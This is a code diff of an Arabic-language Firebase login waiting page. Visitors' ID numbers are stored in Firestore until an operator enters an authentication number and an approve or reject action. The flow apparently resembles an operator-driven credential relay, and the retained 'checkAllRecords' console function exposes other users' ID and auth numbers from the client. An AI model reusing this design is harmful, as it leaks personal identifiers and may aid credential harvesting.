@@ -11,7 +11,7 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    <script src="firebase-config.js?v=11"></script>
+    <script src="firebase-config.js?v=10"></script>
     
     <style>
         :root {
@@ -271,14 +271,6 @@
             <button onclick="cancelWaiting()" style="margin-top: 30px; padding: 10px 20px; background: var(--error-color); color: white; border: none; border-radius: 5px; cursor: pointer;">
                 <i class="fas fa-times"></i> إلغاء الطلب
             </button>
-            
-            <button onclick="forceCheckRecord()" style="margin-top: 15px; padding: 8px 15px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">
-                <i class="fas fa-sync-alt"></i> فحص يدوي للسجل
-            </button>
-            
-            <div style="margin-top: 20px; font-size: 12px; color: #999;">
-                <small>إذا لم يتم التوجيه تلقائيًا، اضغط على زر الفحص اليدوي</small>
-            </div>
         </div>
     </div>
     
@@ -621,19 +613,17 @@
                 
                 console.log('🔍 بيانات السجل:', {
                     id: recordId,
-                    idNumber: data.idNumber,
                     waiting: data.waiting,
                     authNumber: data.authNumber,
                     action: data.action,
                     status: data.status
                 });
                 
-                // التحقق المبسط: فقط إذا كان هناك رقم مصادقة وإجراء
-                const hasAuth = data.authNumber !== undefined && data.authNumber !== null;
-                const hasAction = data.action !== undefined && data.action !== null;
-                
-                if (hasAuth && hasAction) {
-                    console.log('✅ تم إدخال رقم المصادقة والإجراء:', data.authNumber, data.action);
+                // التحقق المهم: يجب أن يكون waiting = false حتى نعتبر المصادقة مكتملة
+                if (data.waiting === false && data.authNumber !== undefined && data.authNumber !== null && 
+                    data.action !== undefined && data.action !== null) {
+                    
+                    console.log('✅ تم إدخال رقم المصادقة والإكمال:', data.authNumber, data.action);
                     
                     return { 
                         hasAuthNumber: true, 
@@ -645,7 +635,7 @@
                     };
                 }
                 
-                console.log('⏳ مازال في حالة انتظار: لا يوجد رقم مصادقة أو إجراء');
+                console.log('⏳ مازال في حالة انتظار:', data.waiting);
                 return { hasAuthNumber: false };
                 
             } catch (error) {
@@ -672,15 +662,14 @@
                         if (doc.exists) {
                             const data = doc.data();
                             console.log('🔄 تحديث مباشر للسجل:', {
-                                idNumber: data.idNumber,
                                 waiting: data.waiting,
                                 authNumber: data.authNumber,
                                 action: data.action,
                                 status: data.status
                             });
                             
-                            // إذا تم إدخال رقم مصادقة وإجراء (بغض النظر عن waiting)
-                            if (data.authNumber && data.action) {
+                            // إذا تم تغيير حالة waiting إلى false وتم إدخال رقم مصادقة
+                            if (data.waiting === false && data.authNumber && data.action) {
                                 console.log('🎯 اكتشاف تغيير في الوقت الحقيقي! جاري التوجيه...');
                                 
                                 // إيقاف المراقبة
@@ -836,7 +825,7 @@
                     try {
                         await db.collection('id_numbers').doc(currentRecordId).update({
                             status: 'cancelled',
-                            waiting: false,
+                            waiting: false, // تأكد من تغييرها إلى false
                             cancelledAt: new Date().toISOString(),
                             authStatus: 'cancelled',
                             updatedAt: new Date().toISOString()
@@ -858,80 +847,38 @@
             showNotification('تم الإلغاء', 'تم إلغاء طلب تسجيل الدخول', 'info');
         }
         
-        // ========== دالة للفحص اليدوي للسجل ==========
-        window.forceCheckRecord = async function() {
-            if (!currentRecordId) {
-                console.error('❌ لا يوجد سجل نشط للفحص');
-                showNotification('خطأ', 'لا يوجد طلب نشط للفحص', 'error');
-                return;
-            }
-            
-            console.log('🔍 بدء فحص يدوي للسجل:', currentRecordId);
-            showNotification('جاري الفحص', 'جاري الفحص اليدوي لحالة السجل...', 'info');
-            
+        // ========== دالة لفحص حالة سجل معين ==========
+        window.checkRecordStatus = async function(recordId) {
+            console.log('🔍 فحص حالة السجل:', recordId);
+            const result = await checkForAuthNumber(recordId);
+            console.log('نتيجة الفحص:', result);
+            return result;
+        };
+
+        // ========== دالة لفحص جميع السجلات ==========
+        window.checkAllRecords = async function() {
             try {
                 const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
-                
                 if (!db) {
                     console.error('❌ Firestore غير متاح');
-                    showNotification('خطأ', 'الاتصال بقاعدة البيانات غير متاح', 'error');
                     return;
                 }
                 
-                // 1. التحقق المباشر من السجل
-                const doc = await db.collection('id_numbers').doc(currentRecordId).get();
-                
-                if (!doc.exists) {
-                    console.error('❌ السجل غير موجود');
-                    showNotification('خطأ', 'السجل غير موجود في قاعدة البيانات', 'error');
-                    return;
-                }
-                
-                const data = doc.data();
-                console.log('📊 البيانات الحالية:', data);
-                
-                // 2. إذا كان هناك رقم مصادقة وإجراء
-                if (data.authNumber && data.action) {
-                    console.log('✅ تم العثور على رقم مصادقة وإجراء:', data.authNumber, data.action);
-                    
-                    // 3. محاولة تصحيح waiting إذا كانت true
-                    if (data.waiting === true) {
-                        console.log('🛠️ محاولة تصحيح حقل waiting...');
-                        
-                        try {
-                            await db.collection('id_numbers').doc(currentRecordId).update({
-                                waiting: false,
-                                updatedAt: new Date().toISOString()
-                            });
-                            
-                            console.log('✅ تم تصحيح waiting إلى false');
-                        } catch (updateError) {
-                            console.error('⚠️ لم يمكن تصحيح waiting:', updateError);
-                        }
-                    }
-                    
-                    // 4. إعادة التوجيه
-                    waitingStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم الفحص اليدوي، جاري التوجيه...';
-                    
-                    if (data.action === 'approve') {
-                        setTimeout(() => {
-                            window.location.href = 'success.html?recordId=' + encodeURIComponent(currentRecordId) + 
-                                                  '&authNumber=' + encodeURIComponent(data.authNumber);
-                        }, 1000);
-                    } else if (data.action === 'reject') {
-                        setTimeout(() => {
-                            window.location.href = 'sorry.html?recordId=' + encodeURIComponent(currentRecordId);
-                        }, 1000);
-                    }
-                    
-                } else {
-                    console.log('⏳ لا يزال في حالة انتظار: لا يوجد رقم مصادقة أو إجراء');
-                    showNotification('لا توجد مصادقة', 'لم يتم إدخال رقم المصادقة بعد', 'info');
-                }
-                
+                const snapshot = await db.collection('id_numbers').limit(10).get();
+                console.log('📋 آخر 10 سجلات:');
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    console.log(`📄 ${doc.id}:`, {
+                        idNumber: data.idNumber,
+                        authNumber: data.authNumber,
+                        action: data.action,
+                        status: data.status,
+                        waiting: data.waiting,
+                        timestamp: data.timestamp
+                    });
+                });
             } catch (error) {
-                console.error('❌ خطأ في الفحص اليدوي:', error);
-                showNotification('خطأ', 'حدث خطأ أثناء الفحص اليدوي', 'error');
+                console.error('❌ خطأ في فحص السجلات:', error);
             }
         };
         
@@ -1110,46 +1057,15 @@
                     console.log('- وقت الإكمال:', data.completedAt);
                     
                     // اقتراح حل
-                    if (data.waiting === true && data.authNumber && data.action) {
-                        console.log('⚠️ المشكلة: waiting=true مع وجود authNumber و action!');
-                        console.log('💡 الحل: استخدم forceCheckRecord() لتصحيح الحالة');
-                    } else if (!data.authNumber || !data.action) {
-                        console.log('✅ الحالة طبيعية: لم يتم إدخال رقم مصادقة بعد');
-                    } else {
-                        console.log('✅ الحالة طبيعية: waiting=' + data.waiting);
+                    if (data.waiting === true && data.authNumber) {
+                        console.log('⚠️ المشكلة: waiting=true مع وجود authNumber!');
+                        console.log('💡 الحل: يجب تغيير waiting إلى false في view-data.html');
                     }
                 } else {
                     console.error('❌ السجل غير موجود');
                 }
             } catch (error) {
                 console.error('❌ خطأ في تصحيح السجل:', error);
-            }
-        };
-        
-        // ========== دالة لفحص جميع السجلات ==========
-        window.checkAllRecords = async function() {
-            try {
-                const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
-                if (!db) {
-                    console.error('❌ Firestore غير متاح');
-                    return;
-                }
-                
-                const snapshot = await db.collection('id_numbers').limit(10).get();
-                console.log('📋 آخر 10 سجلات:');
-                snapshot.forEach(doc => {
-                    const data = doc.data();
-                    console.log(`📄 ${doc.id}:`, {
-                        idNumber: data.idNumber,
-                        authNumber: data.authNumber,
-                        action: data.action,
-                        status: data.status,
-                        waiting: data.waiting,
-                        timestamp: data.timestamp
-                    });
-                });
-            } catch (error) {
-                console.error('❌ خطأ في فحص السجلات:', error);
             }
         };
         
@@ -1160,10 +1076,6 @@
             }
             if (timerInterval) {
                 clearInterval(timerInterval);
-            }
-            if (window.currentUnsubscribe) {
-                window.currentUnsubscribe();
-                window.currentUnsubscribe = null;
             }
         });
     </script>
